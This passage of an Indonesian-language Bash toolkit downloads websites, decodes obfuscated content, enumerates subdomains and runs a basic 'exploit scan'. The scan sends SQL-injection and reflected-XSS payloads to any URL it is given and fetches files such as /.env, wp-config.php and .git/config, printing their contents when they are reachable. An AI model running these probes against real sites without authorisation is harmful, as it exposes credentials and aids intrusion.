    for pattern in "${base64_patterns[@]}"; do
        if echo "$content" | grep -q -i "$pattern"; then
            echo -e "${YELLOW}[!] Found pattern: $pattern${NC}"
            found_encoded=true
        fi
    done

    if echo "$content" | grep -q -E "[A-Za-z0-9+/]{100,}={0,2}"; then
        echo -e "${YELLOW}[!] Found potential Base64 string (long)${NC}"
        found_encoded=true
    fi

    [[ "$found_encoded" == true ]] && {
        show_loading "Memulai decryption"
        echo -e "\n${RED}[*] Encoded content detected! Starting decryption...${NC}"

        echo -e "${CYAN}[*] Extracting all potential Base64 strings...${NC}"

        local all_base64=$(echo "$content" | grep -o -E "[A-Za-z0-9+/]{20,}={0,2}")

        [[ ! -z "$all_base64" ]] && {
            echo -e "${YELLOW}[*] Found $(echo "$all_base64" | wc -l) potential Base64 strings${NC}"

            local counter=1
            echo "$all_base64" | while read -r b64_string; do
                [[ ${#b64_string} -gt 50 ]] && {
                    echo -e "\n${CYAN}[String $counter - Length: ${#b64_string}]${NC}"
                    echo -e "${YELLOW}Trying to decode...${NC}"

                    local decoded=$(echo "$b64_string" | base64 -d 2>/dev/null)

                    [[ $? -eq 0 ]] && [[ ! -z "$decoded" ]] && {
                        echo -e "${RED}[+] Decoded successfully!${NC}"
                        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
                        echo -e "${CYAN}[ PREVIEW DECODED CONTENT $counter ]${NC}"
                        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
                        echo -e "${RED}"
                        echo "$decoded" | head -n 10
                        echo -e "${NC}"
                        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"

                        decrypt_base64_layers "$decoded"
                    }
                    counter=$((counter + 1))
                }
            done
        }

        echo -e "${CYAN}[*] Checking for inline Base64 in HTML...${NC}"

        echo "$content" | grep -o -E 'base64,[A-Za-z0-9+/]+={0,2}' | while read -r inline_b64; do
            local clean_b64=$(echo "$inline_b64" | sed 's/base64,//')
            [[ ! -z "$clean_b64" ]] && {
                echo -e "${YELLOW}[*] Found inline Base64, trying to decode...${NC}"
                local decoded=$(echo "$clean_b64" | base64 -d 2>/dev/null)
                [[ $? -eq 0 ]] && [[ ! -z "$decoded" ]] && {
                    echo -e "${RED}[+] Inline Base64 decoded!${NC}"
                    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
                    echo "$decoded" | head -n 5
                    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
                }
            }
        done

        show_loading "Full HTML decryption"
        echo -e "${CYAN}[*] Full HTML Base64 decryption attempt...${NC}"
        decrypt_base64_layers "$content"

    } || {
        echo -e "${YELLOW}[-] No obvious encoded content detected${NC}"
        echo -e "${CYAN}[*] Showing original HTML structure...${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
        echo -e "${RED}"
        head -n 30 "$file"
        echo -e "${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    }

    show_loading "Checking JavaScript"
    echo -e "${CYAN}[*] Checking for JavaScript obfuscation...${NC}"

    local js_obfuscation_patterns=(
        "eval("
        "document.write"
        "unescape("
        "String.fromCharCode"
        "\\x[0-9a-fA-F]{2}"
        "\\\\u[0-9a-fA-F]{4}"
    )

    for pattern in "${js_obfuscation_patterns[@]}"; do
        if echo "$content" | grep -q "$pattern"; then
            echo -e "${YELLOW}[!] Possible JS obfuscation found: $pattern${NC}"
        fi
    done

    show_loading "Checking hex encoding"
    echo -e "${CYAN}[*] Checking for hex encoded content...${NC}"
    if echo "$content" | grep -q -E "\\\\x[0-9a-fA-F]{2}"; then
        echo -e "${YELLOW}[!] Found hex encoded strings (\x format)${NC}"
    fi

    if echo "$content" | grep -q -E "%[0-9a-fA-F]{2}"; then
        echo -e "${YELLOW}[!] Found URL encoded strings (% format)${NC}"
        echo -e "${CYAN}[*] Attempting URL decode...${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
        echo "$content" | sed 's/%20/ /g; s/%21/!/g; s/%22/"/g; s/%23/#/g; s/%24/$/g; s/%25/%/g; s/%26/\&/g' | head -n 10
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    fi
}

display_source() {
    local file=$1
    local max_lines=50

    echo -e "\n${PURPLE}════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}[ PREVIEW FILE: $(basename "$file") ]${NC}"
    echo -e "${PURPLE}════════════════════════════════════════════════════════════${NC}"

    [[ -f "$file" ]] && {
        [[ $(wc -l < "$file") -gt $max_lines ]] && echo -e "${YELLOW}[!] File terlalu besar, menampilkan $max_lines baris pertama${NC}"

        local extension="${file##*.}"

        case $extension in
            "html")
                echo -e "${RED}"
                head -n $max_lines "$file"
                echo -e "${NC}"
                check_and_decrypt_html "$file"
                ;;
            "css")
                echo -e "${CYAN}"
                head -n $max_lines "$file"
                echo -e "${NC}"
                ;;
            "js")
                echo -e "${YELLOW}"
                head -n $max_lines "$file"
                echo -e "${NC}"

                echo -e "${CYAN}[*] Analysing JavaScript for obfuscation...${NC}"
                grep -q "eval\|unescape\|fromCharCode\|document.write" "$file" && echo -e "${YELLOW}[!] Possible JavaScript obfuscation detected${NC}"
                ;;
            *)
                echo -e "${BLUE}"
                head -n $max_lines "$file"
                echo -e "${NC}"
                ;;
        esac

        local line_count=$(wc -l < "$file" | tr -d ' ')
        local file_size=$(du -h "$file" 2>/dev/null | cut -f1 || echo "N/A")
        echo -e "${PURPLE}════════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}Total: $line_count baris | Size: $file_size${NC}"
    } || echo -e "${RED}[!] File tidak ditemukan${NC}"
}

download_files() {
    local url=$1

    [[ -z "$url" ]] && echo -e "${RED}[!] URL target tidak boleh kosong${NC}" && return

    [[ ! $url =~ ^https?:// ]] && url="http://$url"

    spin "Menyiapkan download"
    echo -e "${YELLOW}[*] Memulai download dari: $url${NC}"

    local domain=$(echo $url | sed -e 's|^[^/]*//||' -e 's|/.*$||')
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local folder="downloads/${domain}_${timestamp}"

    mkdir -p "$folder"

    spin "Mendownload HTML"
    echo -e "${YELLOW}[*] Mendownload HTML...${NC}"
    wget --timeout=30 --tries=2 --no-check-certificate -q -O "${folder}/index.html" "$url"

    [[ $? -eq 0 ]] && {
        echo -e "${RED}[+] HTML berhasil didownload${NC}"

        echo -e "\n${CYAN}════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}[ PREVIEW SOURCE CODE HTML ]${NC}"
        echo -e "${CYAN}════════════════════════════════════════════════${NC}"
        echo -e "${RED}"
        head -n 30 "${folder}/index.html" | while IFS= read -r line; do
            echo "$line"
        done
        echo -e "${NC}"
        echo -e "${CYAN}════════════════════════════════════════════════${NC}"

        spin "Scanning encoded content"
        echo -e "${MAGENTA}[*] Scanning for encoded/encrypted content...${NC}"
        check_and_decrypt_html "${folder}/index.html"

        cd "$folder"

        css_files=0
        js_files=0
        img_files=0

        spin "Mencari assets"
        echo -e "${YELLOW}[*] Mencari dan mendownload assets...${NC}"

        grep -o -E 'href="[^"]*\.css[^"]*"' "index.html" | sed 's/href="//g' | sed 's/"//g' | while read css_url; do
            echo -e "${YELLOW}[*] Mendownload CSS: $css_url${NC}"
            wget --timeout=30 --tries=2 --no-check-certificate -q -N "$css_url" 2>/dev/null || wget --timeout=30 --tries=2 --no-check-certificate -q -N "${url%/*}/$css_url" 2>/dev/null
            [[ $? -eq 0 ]] && css_files=$((css_files + 1)) && {
                local css_file=$(basename "$css_url" | cut -d'?' -f1)
                [[ -f "$css_file" ]] && {
                    echo -e "\n${CYAN}[ PREVIEW CSS: $css_file ]${NC}"
                    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
                    echo -e "${CYAN}"
                    head -n 20 "$css_file" 2>/dev/null || echo "[File CSS ditemukan tapi tidak bisa dibaca]"
                    echo -e "${NC}"
                    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
                }
            }
        done

        grep -o -E 'src="[^"]*\.js[^"]*"' "index.html" | sed 's/src="//g' | sed 's/"//g' | while read js_url; do
            show_loading "Download JS"
            echo -e "${YELLOW}[*] Mendownload JS: $js_url${NC}"
            wget --timeout=30 --tries=2 --no-check-certificate -q -N "$js_url" 2>/dev/null || wget --timeout=30 --tries=2 --no-check-certificate -q -N "${url%/*}/$js_url" 2>/dev/null
            [[ $? -eq 0 ]] && js_files=$((js_files + 1)) && {
                local js_file=$(basename "$js_url" | cut -d'?' -f1)
                [[ -f "$js_file" ]] && {
                    echo -e "\n${YELLOW}[ PREVIEW JAVASCRIPT: $js_file ]${NC}"
                    echo -e "${YELLOW}════════════════════════════════════════════════${NC}"
                    echo -e "${YELLOW}"
                    head -n 20 "$js_file" 2>/dev/null || echo "[File JS ditemukan tapi tidak bisa dibaca]"
                    echo -e "${NC}"
                    echo -e "${YELLOW}════════════════════════════════════════════════${NC}"

                    show_loading "Checking JS content"
                    echo -e "${MAGENTA}[*] Checking JS for encoded content...${NC}"
                    check_and_decrypt_html "$js_file"
                }
            }
        done

        grep -o -E 'src="[^"]*\.(png|jpg|jpeg|gif|ico|svg)[^"]*"' "index.html" | sed 's/src="//g' | sed 's/"//g' | while read img_url; do
            echo -e "${YELLOW}[*] Mendownload Image: $img_url${NC}"
            wget --timeout=30 --tries=2 --no-check-certificate -q -N "$img_url" 2>/dev/null || wget --timeout=30 --tries=2 --no-check-certificate -q -N "${url%/*}/$img_url" 2>/dev/null
            [[ $? -eq 0 ]] && img_files=$((img_files + 1))
        done

        cd - > /dev/null

        show_loading "Membuat summary"
        echo -e "\n${RED}════════════════════════════════════════════════${NC}"
        echo -e "${RED}[ DOWNLOAD SUMMARY ]${NC}"
        echo -e "${RED}════════════════════════════════════════════════${NC}"
        echo -e "${RED}Folder: $folder${NC}"
        echo -e "${RED}Total files downloaded:${NC}"
        echo -e "  • HTML: 1 file"
        echo -e "  • CSS: $css_files files"
        echo -e "  • JavaScript: $js_files files"
        echo -e "  • Images: $img_files files"

        echo -e "\n${CYAN}[ LIST FILE YANG DIDOWNLOAD ]${NC}"
        echo -e "${CYAN}════════════════════════════════════════════════${NC}"
        find "$folder" -type f | while read -r file; do
            local size=$(du -h "$file" 2>/dev/null | cut -f1 || echo "N/A")
            local lines=$(wc -l "$file" 2>/dev/null | awk '{print $1}' || echo "0")
            echo -e "${BLUE}$file${NC} | Size: ${RED}$size${NC} | Lines: ${YELLOW}$lines${NC}"
        done

        show_loading "Menampilkan source code"
        echo -e "\n${YELLOW}[*] Menampilkan full HTML source code...${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}"
        cat "${folder}/index.html"
        echo -e "${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════════════════${NC}"

        spin "Final decoding check"
        echo -e "\n${MAGENTA}[*] Final decoding check on full HTML...${NC}"
        check_and_decrypt_html "${folder}/index.html"

    } || echo -e "${RED}[-] Gagal mendownload HTML${NC}"
}

auto_decrypt_file() {
    echo -ne "${YELLOW}Masukkan path file yang ingin di-decrypt: ${NC}"
    read -r file_path

    [[ ! -f "$file_path" ]] && echo -e "${RED}[!] File tidak ditemukan: $file_path${NC}" && return

    spin "Memulai auto-decrypt"
    echo -e "${MAGENTA}[*] Starting auto-decrypt on: $file_path${NC}"

    local file_content=$(cat "$file_path")

    decrypt_base64_layers "$file_content"

    spin "Checking other encodings"
    echo -e "\n${CYAN}[*] Checking for other encodings...${NC}"

    spin "Trying hex decode"
    echo -e "${YELLOW}[*] Trying hex decode if applicable...${NC}"
    if echo "$file_content" | grep -q -E "(\\\\x[0-9a-fA-F]{2}){5,}"; then
        echo -e "${RED}[!] Hex encoded content detected${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
        echo "$file_content" | sed 's/\\x//g' | xxd -r -p 2>/dev/null | head -n 10
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    fi

    spin "Checking ROT13"
    echo -e "${YELLOW}[*] Checking for ROT13...${NC}"
    if echo "$file_content" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | grep -q -E "<html|<!DOCTYPE|function|var "; then
        echo -e "${RED}[!] ROT13 encoded content detected${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
        echo "$file_content" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | head -n 10
        echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    fi
}

exploit_scan() {
    local url=$1

    [[ -z "$url" ]] && echo -e "${RED}[!] URL target tidak boleh kosong${NC}" && return

    [[ ! $url =~ ^https?:// ]] && url="http://$url"

    spin "Memulai scanning exploit"
    echo -e "${YELLOW}[*] Memulai scanning exploit pada: $url${NC}"
    echo -e "${YELLOW}[*] Ini mungkin memerlukan waktu...${NC}"

    spin "Testing SQL Injection"
    echo -e "\n${BLUE}[1] Testing SQL Injection${NC}"
    test_url="${url}?id=1'"
    echo -e "${CYAN}[*] Mengirim payload: ?id=1' ${NC}"
    response=$(timeout 10 curl -s -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null || echo "000")
    echo -e "${CYAN}[*] Response code: $response${NC}"
    [[ "$response" =~ ^(500|200)$ ]] && echo -e "${RED}[+] Possible SQLi (Payload: ' )${NC}"

    spin "Testing XSS"
    echo -e "\n${BLUE}[2] Testing XSS${NC}"
    test_url="${url}?q=<script>alert(1)</script>"
    echo -e "${CYAN}[*] Mengirim payload: <script>alert(1)</script>${NC}"
    response=$(timeout 10 curl -s -L "$test_url" 2>/dev/null | grep -c "<script>alert(1)</script>" || echo "0")
    echo -e "${CYAN}[*] Response mengandung payload: $response kali${NC}"
    [[ "$response" -gt 0 ]] && echo -e "${RED}[+] Possible XSS (Reflected)${NC}"

    spin "Checking Sensitive Files"
    echo -e "\n${BLUE}[3] Checking Sensitive Files${NC}"
    files=("/.env" "/config.php" "/.git/config" "/robots.txt" "/phpinfo.php" "/wp-config.php" "/.htaccess" "/web.config")
    for file in "${files[@]}"; do
        test_url="${url}${file}"
        echo -e "${CYAN}[*] Checking: $file${NC}"
        response=$(timeout 10 curl -s -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null || echo "000")
        echo -e "${CYAN}[*] Response code: $response${NC}"
        [[ "$response" == "200" ]] && {
            echo -e "${RED}[+] Found: $file (Code: $response)${NC}"
            echo -e "${YELLOW}[*] Menampilkan konten file:${NC}"
            timeout 5 curl -s "$test_url" | head -n 20
            echo ""
        }
    done

    show_loading "Checking Directory Listing"
    echo -e "\n${BLUE}[4] Checking Directory Listing${NC}"
    test_url="${url%/}/"
    echo -e "${CYAN}[*] Testing: $test_url${NC}"
    response=$(timeout 10 curl -s "$test_url" 2>/dev/null | grep -i "index of" || echo "")
    [[ ! -z "$response" ]] && {
        echo -e "${RED}[+] Directory listing enabled${NC}"
        echo -e "${YELLOW}[*] Menampilkan preview directory listing:${NC}"
        timeout 5 curl -s "$test_url" | grep -o 'href="[^"]*"' | sed 's/href="//g' | sed 's/"//g' | head -10
    }

    show_loading "Checking encoded content"
    echo -e "\n${BLUE}[5] Checking for encoded content in source${NC}"
    echo -e "${CYAN}[*] Mendownload source code untuk dianalisa...${NC}"
    temp_file="/tmp/source_$(date +%s).html"
    timeout 10 curl -s -o "$temp_file" "$url"

    [[ -f "$temp_file" ]] && {
        echo -e "${YELLOW}[*] Analysing for encoded content...${NC}"
        check_and_decrypt_html "$temp_file"
        rm -f "$temp_file"
    }

    spin "Scanning selesai"
    echo -e "\n${YELLOW}[*] Scanning selesai${NC}"
    echo -e "${YELLOW}[*] Note: Hasil ini hanya indikasi awal${NC}"
}

check_subdomain_tools() {
    command -v python3 >/dev/null 2>&1 || {
        echo -e "${YELLOW}[!] Python3 tidak terinstall. Menggunakan metode manual...${NC}"
        return 1
    }
    
    python3 -c "import requests" 2>/dev/null || {
        echo -e "${YELLOW}[!] Modul requests tidak tersedia. Menggunakan metode manual...${NC}"
        return 1
    }
    
    echo -e "${RED}[+] Python3 dan requests tersedia${NC}"
    return 0
}

scan_subdomains() {
    local domain=$1

    [[ -z "$domain" ]] && {
        echo -ne "${YELLOW}Masukkan domain target (contoh: example.com): ${NC}"
        read -r domain
    }

    [[ -z "$domain" ]] && echo -e "${RED}[!] Domain tidak boleh kosong${NC}" && return

    echo -e "\n${CYAN}[*] Memilih metode scanning:${NC}"
    echo -e "  ${YELLOW}[1] Manual scanning (built-in wordlist)${NC}"
    echo -e "  ${YELLOW}[2] Python-based scanning (lebih cepat)${NC}"
    echo ""
    
    printf "   ${RED}┏━[ ${RED}ShadowNex X Tools${NC} ${RED}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} SUBDOMAIN ${YELLOW}${RED}]${NC}${RED}\n   ┗━━${RED}❯${YELLOW}❯${RED}❯${YELLOW} "
    read -r method_choice

    case $method_choice in
        1)
            scan_subdomains_manual "$domain"
            ;;
        2)
            scan_subdomains_python "$domain"
            ;;
        *)
            echo -e "${RED}[!] Pilihan tidak valid, menggunakan metode manual${NC}"
            scan_subdomains_manual "$domain"
            ;;
    esac
}

scan_subdomains_manual() {
    local domain=$1

    [[ -z "$domain" ]] && {
        echo -ne "${YELLOW}Masukkan domain target (contoh: example.com): ${NC}"
        read -r domain
    }

    [[ -z "$domain" ]] && echo -e "${RED}[!] Domain tidak boleh kosong${NC}" && return

    spin "Memulai subdomain scanning"
    echo -e "${MAGENTA}[*] Memulai subdomain scanning pada: $domain${NC}"
    echo -e "${YELLOW}[*] Ini mungkin memerlukan waktu...${NC}"

    local wordlist_file="wordlists/subdomains.txt"
    
    [[ ! -f "$wordlist_file" ]] && {
        show_loading "Membuat wordlist"
        echo -e "${CYAN}[*] Membuat wordlist subdomain lokal...${NC}"
        mkdir -p wordlists
        cat > "$wordlist_file" << EOF
www
mail
ftp
localhost
test
dev
admin
blog
api
webmail
server
ns1
ns2
ns3
smtp
pop
imap
vpn
m
mobile
support
forum
shop
store
portal
demo
beta
app
apps
web
secure
docs
status
help
cpanel
whm
autodiscover
autoconfig
git
svn
proxy
cdn
media
stats
dns
email
webdisk
direct
direct-connect
blog
blogs
news
chat
forum
forums
wiki
download
downloads
uploads
images
img
video
videos
music
search
member
members
account
accounts
auth
login
signin
register
signup
secure
ssl
payment
payments
checkout
cart
shop
store
buy
sell
cloud
cluster
node
server1
server2
server3
staging
prod
production
live
stage
test1
test2
test3
db
database
mysql
sql
oracle
postgres
mongodb
redis
memcached
elasticsearch
solr
kibana
grafana
prometheus
jenkins
gitlab
bitbucket
jira
confluence
sonar
nexus
artifactory
docker
registry
kubernetes
k8s
openshift
rancher
traefik
nginx
apache
tomcat
jetty
wildfly
jboss
glassfish
weblogic
websphere
iis
EOF
        echo -e "${RED}[+] Wordlist dibuat: $wordlist_file${NC}"
    }

    local total_lines=$(wc -l < "$wordlist_file" 2>/dev/null | tr -d ' ' || echo "0")
    echo -e "${CYAN}[*] Menggunakan wordlist: $wordlist_file (${total_lines} kata)${NC}"

    local found_count=0
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="subdomains_${domain}_${timestamp}.txt"

    spin "Memulai brute force"
    echo -e "${RED}[*] Memulai brute force subdomain...${NC}"
    echo -e "${CYAN}[*] Press Ctrl+C untuk berhenti${NC}"

    while read -r subdomain; do
        [[ -n "$subdomain" ]] && {
            local test_host="${subdomain}.${domain}"
            echo -ne "${BLUE}[TRY] ${test_host}...${NC}"

            local ip=$(timeout 5 host "$test_host" 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -1)

            [[ -n "$ip" ]] && {
                echo -e "${RED} FOUND! (${ip})${NC}"
                echo "${test_host} - ${ip}" >> "$output_file"
                found_count=$((found_count + 1))

                show_loading "Testing HTTP/HTTPS"
                echo -e "${YELLOW}[*] Testing HTTP/HTTPS...${NC}"
                local http_url="http://${test_host}"
                local https_url="https://${test_host}"
                
                local http_code=$(timeout 10 curl -s -o /dev/null -w "%{http_code}" "$http_url" 2>/dev/null || echo "000")
                [[ "$http_code" != "000" ]] && [[ "$http_code" != "" ]] && {
                    echo -e "${RED}[HTTP] ${http_url} - Code: ${http_code}${NC}"
                    echo "${test_host} - HTTP:${http_code}" >> "$output_file"
                }

                local https_code=$(timeout 10 curl -s -o /dev/null -w "%{http_code}" -k "$https_url" 2>/dev/null || echo "000")
                [[ "$https_code" != "000" ]] && [[ "$https_code" != "" ]] && {
                    echo -e "${RED}[HTTPS] ${https_url} - Code: ${https_code}${NC}"
                    echo "${test_host} - HTTPS:${https_code}" >> "$output_file"
                }
            } || echo -e "${RED} NOT FOUND${NC}"
        }
    done < "$wordlist_file"

    show_loading "Mencari dari SSL"
    echo -e "\n${CYAN}[*] Mencari subdomain dari SSL certificate...${NC}"
    timeout 15 openssl s_client -connect "${domain}:443" -servername "${domain}" 2>/dev/null | openssl x509 -noout -text 2>/dev/null | grep -oE 'DNS:[^,]*' | sed 's/DNS://g' | while read -r ssl_subdomain; do
        [[ ! "$ssl_subdomain" =~ \* ]] && [[ "$ssl_subdomain" != "$domain" ]] && {
            echo -e "${RED}[SSL] Found: ${ssl_subdomain}${NC}"
            echo "${ssl_subdomain} - SSL_CERT" >> "$output_file"
            found_count=$((found_count + 1))
        }
    done

    show_loading "Mencari dari search engine"
    echo -e "\n${CYAN}[*] Mencari subdomain dari search engine (menggunakan curl)...${NC}"
    local search_urls=(
        "https://www.google.com/search?q=site%3A${domain}"
        "https://www.bing.com/search?q=site%3A${domain}"
    )

    for search_url in "${search_urls[@]}"; do
        echo -e "${YELLOW}[*] Checking: $(echo "$search_url" | cut -d'?' -f1)${NC}"
        local search_result=$(timeout 15 curl -s -k -A "Mozilla/5.0" "$search_url" 2>/dev/null | grep -oE "[a-zA-Z0-9.-]+\.${domain}" | sort -u)
        [[ -n "$search_result" ]] && echo "$search_result" | while read -r found_sub; do
            [[ ! "$found_sub" =~ \.\. ]] && [[ "$found_sub" != "$domain" ]] && {
                echo -e "${RED}[SEARCH] Found: ${found_sub}${NC}"
                echo "${found_sub} - SEARCH_ENGINE" >> "$output_file"
                found_count=$((found_count + 1))
            }
        done
    done

    show_loading "Menyelesaikan scan"
    echo -e "\n${RED}════════════════════════════════════════════════${NC}"
    echo -e "${RED}[ SUBDOMAIN SCAN COMPLETE ]${NC}"
    echo -e "${RED}════════════════════════════════════════════════${NC}"

    [[ -f "$output_file" ]] && [[ $found_count -gt 0 ]] && {
        echo -e "${RED}[+] Total subdomain ditemukan: ${found_count}${NC}"
        echo -e "${RED}[+] Hasil disimpan di: ${output_file}${NC}"
        
        echo -e "\n${CYAN}[ LIST SUBDOMAIN YANG DITEMUKAN ]${NC}"
        echo -e "${CYAN}════════════════════════════════════════════════${NC}"
        cat "$output_file"
        echo -e "${CYAN}════════════════════════════════════════════════${NC}"

        show_loading "Filtering aktif subdomain"
        echo -e "\n${YELLOW}[*] Menampilkan subdomain dengan HTTP/HTTPS aktif...${NC}"
        grep -E "HTTP:|HTTPS:" "$output_file" || echo -e "${YELLOW}[-] Tidak ada HTTP/HTTPS aktif${NC}"
    } || {
        echo -e "${YELLOW}[-] Tidak ada subdomain yang ditemukan${NC}"
        [[ -f "$output_file" ]] && rm -f "$output_file"
    }

    echo -e "\n${MAGENTA}[*] Scanning selesai untuk domain: ${domain}${NC}"
}

scan_subdomains_python() {
    local domain=$1

    [[ -z "$domain" ]] && {
        echo -ne "${YELLOW}Masukkan domain target (contoh: example.com): ${NC}"
        read -r domain
    }

    [[ -z "$domain" ]] && echo -e "${RED}[!] Domain tidak boleh kosong${NC}" && return

    show_loading "Memeriksa dependensi Python"
    check_subdomain_tools
    local can_use_python=$?

    [[ $can_use_python -ne 0 ]] && {
        echo -e "${RED}[!] Tidak dapat menggunakan metode Python. Fallback ke manual method.${NC}"
        scan_subdomains_manual "$domain"
        return
    }

    show_loading "Membuat script Python untuk scanning"
    
    local python_script=$(mktemp)
    cat > "$python_script" << 'PYTHONEOF'
import sys
import socket
import requests
import concurrent.futures
import time
import os

domain = sys.argv[1]
threads = int(sys.argv[2]) if len(sys.argv) > 2 else 15

builtin = [
    "www", "mail", "ftp", "admin", "webmail", "test",
    "dev", "staging", "api", "secure", "portal", "cpanel",
    "vpn", "smtp", "shop", "blog", "m", "beta"
]

wordlist_file = "dns_wordlist.txt"
candidates = list(builtin)

try:
    with open(wordlist_file, "r", encoding="utf-8") as fh:
        file_list = [line.strip() for line in fh if line.strip() and not line.startswith("#")]
        candidates.extend(file_list)
except FileNotFoundError:
    pass

seen = set()
candidates_filtered = []
for c in candidates:
    if c not in seen:
        seen.add(c)
        candidates_filtered.append(c)

def test_subdomain(sub):
    try:
        test_domain = f"{sub}.{domain}"
        ip = socket.gethostbyname(test_domain)
        
        session = requests.Session()
        session.headers.update({"User-Agent": "Xynthenro-Subfinder/1.0"})
        
        for scheme in ("https://", "http://"):
            url = f"{scheme}{test_domain}"
            try:
                resp = session.get(url, timeout=6, allow_redirects=True, verify=False)
                if resp.status_code < 400:
                    return {
                        'subdomain': test_domain,
                        'ip': ip,
                        'reachable': True,
                        'http_status': resp.status_code,
                        'note': f"Responds over {scheme[:-3].upper()}"
                    }
            except:
                continue
        
        return {
            'subdomain': test_domain,
            'ip': ip,
            'reachable': False,
            'http_status': None,
            'note': 'Resolved but no HTTP service'
        }
        
    except socket.gaierror:
        return None
    except Exception as e:
        return None

print(f"[*] Starting subdomain enumeration for: {domain}")
print(f"[*] Checking {len(candidates_filtered)} candidates with {threads} threads...")

results = []
with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
    future_to_sub = {executor.submit(test_subdomain, sub): sub for sub in candidates_filtered}
    
    for future in concurrent.futures.as_completed(future_to_sub):
        sub = future_to_sub[future]
        try:
            res = future.result()
            if res:
                results.append(res)
                if res['reachable']:
                    print(f"[+] Subdomain ditemukan: {res['subdomain']} | IP: {res['ip']} | {res['note']}")
                else:
                    print(f"[~] Resolved: {res['subdomain']} | IP: {res['ip']} | {res['note']}")
        except Exception as e:
            pass

if not results:
    print("[-] Tidak ditemukan subdomain aktif")
else:
    print(f"\n[+] Selesai. Ditemukan {len(results)} entri.")
    
    output_file = f"subdomains_{domain}_{int(time.time())}.txt"
    with open(output_file, "w") as f:
        for res in results:
            f.write(f"{res['subdomain']} - {res['ip']}\n")
            if res['http_status']:
                f.write(f"{res['subdomain']} - HTTP:{res['http_status']}\n")
    
    print(f"[+] Hasil disimpan di: {output_file}")
PYTHONEOF

    echo -e "${CYAN}[*] Menjalankan scanning dengan Python...${NC}"
    python3 "$python_script" "$domain" 20
    
    rm -f "$python_script"
    
    echo -e "\n${RED}════════════════════════════════════════════════${NC}"
    echo -e "${RED}[ PYTHON SUBDOMAIN SCAN COMPLETE ]${NC}"
    echo -e "${RED}════════════════════════════════════════════════${NC}"
}

detect_programming_language() {
    local question="$1"
    local lang="general"
    
    case "${question,,}" in
        *python*|*pandas*|*numpy*|*django*|*flask*)
            lang="python"
            ;;
        *javascript*|*js*|*node*|*react*|*vue*|*angular*|*typescript*)
            lang="javascript"
            ;;
        *java*|*spring*|*android*)
            lang="java"
            ;;
        *php*|*laravel*|*codeigniter*)
            lang="php"
            ;;
        *c++*|*cpp*)
            lang="cpp"
            ;;
        *c#*|*csharp*|*.net*)
            lang="csharp"
            ;;
        *bash*|*shell*|*sh*|*terminal*|*linux*)
            lang="bash"
            ;;
        *sql*|*mysql*|*postgresql*|*database*)
            lang="sql"
            ;;
        *html*|*css*|*frontend*)
            lang="web"
            ;;
        *docker*|*kubernetes*|*devops*)
            lang="devops"
            ;;
        *security*|*hacking*|*pentest*)
            lang="security"
            ;;
    esac
    
    echo "$lang"
}

highlight_code() {
    local code="$1"
    echo -e "${PURPLE}┌────────────────────────────────────────────${NC}"
    echo -e "${CYAN}$code${NC}"
    echo -e "${PURPLE}└────────────────────────────────────────────${NC}"
}

ai_chat() {
    sound_klik
    clear    
    spasi
    echo -e "${RED}
░█████╗░██╗░░██╗░█████╗░████████╗░░░░█████╗░██╗
██╔══██╗██║░░██║██╔══██╗╚══██╔══╝░░░██╔══██╗██║
██║░░╚═╝███████║███████║░░░██║░░░░░░███████║██║
${WHITE}██║░░██╗██╔══██║██╔══██║░░░██║░░░░░░██╔══██║██║
╚█████╔╝██║░░██║██║░░██║░░░██║░░░██╗██║░░██║██║
░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚═╝
${RED}[ ✓ ] ASSISTEN PROGRAMMER AI${NC}"
    echo "CARA KELUAR DARI AI CHAT: ketik Q lalu ENTER"
    echo
    echo "ShadowNex X Tools - Asisten Programmer"
    echo -e "${YELLOW}Mode: Expert Programming Assistant${NC}"
    echo

    while true; do
        echo -n "Pertanyaan Kamu: "
        read -r pertanyaan

        case "$pertanyaan" in
            [qQ])
                echo
                echo "Keluar dari chat..."
                sleep 1
                kembali_ke_menu
                return
                ;;
            "")
                echo -e "${RED}[!] Pertanyaan tidak boleh kosong${NC}"
                echo
                continue
                ;;
        esac

        [[ "${pertanyaan,,}" =~ (siapa nama|namamu siapa|who are you) ]] && {
            echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
            echo -e "${CYAN}Programmer Assistant:${NC} Saya adalah Asisten Programmer ShadowNex X Tools, siap membantu dengan masalah coding, debugging, dan development!"
            echo
            continue
        }

        spin "Memproses pertanyaan programmer"

        local detected_lang=$(detect_programming_language "$pertanyaan")
        
        case $detected_lang in
            "python")
                echo -e "${RED}[Detected: Python]${NC}"
                ;;
            "javascript")
                echo -e "${YELLOW}[Detected: JavaScript]${NC}"
                ;;
            "java")
                echo -e "${RED}[Detected: Java]${NC}"
                ;;
            "php")
                echo -e "${BLUE}[Detected: PHP]${NC}"
                ;;
            "bash")
                echo -e "${CYAN}[Detected: Bash/Shell]${NC}"
